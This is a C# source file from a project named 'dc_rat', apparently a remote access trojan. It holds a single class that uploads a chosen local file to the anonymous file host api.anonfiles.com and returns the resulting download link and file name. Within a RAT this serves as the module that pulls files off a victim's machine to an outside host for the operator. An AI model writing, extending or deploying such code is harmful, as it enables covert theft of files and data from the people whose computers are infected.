using System;
using System.Collections.Generic;
using System.Net;
using System.Text;

namespace dc_rat
{
    public class Anonfiles
    {
        public static string CreateDownloadLink(string File)
        {
            string ReturnValue = string.Empty;
            try
            {
                using (WebClient Client = new WebClient())
                {
                    byte[] Response = Client.UploadFile("https://api.anonfiles.com/upload", File);
                    string ResponseBody = Encoding.ASCII.GetString(Response);
                    if (ResponseBody.Contains("\"error\": {"))
                    {
                        ReturnValue += "There was a erorr while uploading the file.\r\n";
                        ReturnValue += "Error message: " + ResponseBody.Split('"')[7] + "\r\n";
                    }
                    else
                    {
                        ReturnValue += "Download link: " + ResponseBody.Split('"')[15] + "\r\n";
                        ReturnValue += "File name:     " + ResponseBody.Split('"')[25] + "\r\n";
                    }
                }
            }
            catch (Exception Exception)
            {
                ReturnValue += "Exception Message:\r\n" + Exception.Message + "\r\n";
            }
            return ReturnValue;
        }
    }
}
